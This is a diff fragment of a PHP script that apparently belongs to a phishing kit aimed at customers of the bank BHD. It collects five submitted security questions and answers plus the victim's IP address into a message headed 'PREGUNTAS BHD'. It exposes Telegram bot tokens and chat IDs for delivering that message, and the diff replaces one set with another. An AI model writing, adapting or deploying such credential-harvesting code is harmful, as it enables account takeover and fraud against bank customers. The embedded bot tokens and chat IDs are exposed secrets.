@@ -12,11 +12,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 	$resp4 = $_POST["resp4"];
 	$resp5 = $_POST["resp5"];
 	
-  $botToken = "8912252632:AAEJf_puzYmDrMbn_Y2kOqhWAMgc-wBc0VI"; // Reemplaza con tu token de bot
-    $chatID = "8555745789"; // Reemplaza con tu chat ID
+  $botToken = "7356380446:AAERwTFEndqW0wSfHHhuajIg70Ld8fSW6GM"; // Reemplaza con tu token de bot
+    $chatID = "5868379051"; // Reemplaza con tu chat ID
 
     // Obtén la IP del cliente
-    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+    $ip = $_SERVER['REMOTE_ADDR'];
 
     // Construye el mensaje
     $message = "=====PREGUNTAS BHD=======\n $preg1\n $resp1\n $preg2\n $resp2\n $preg3\n $resp3\n $preg4\n $resp4\n $preg5\n $resp5\nIP del cliente: $ip";
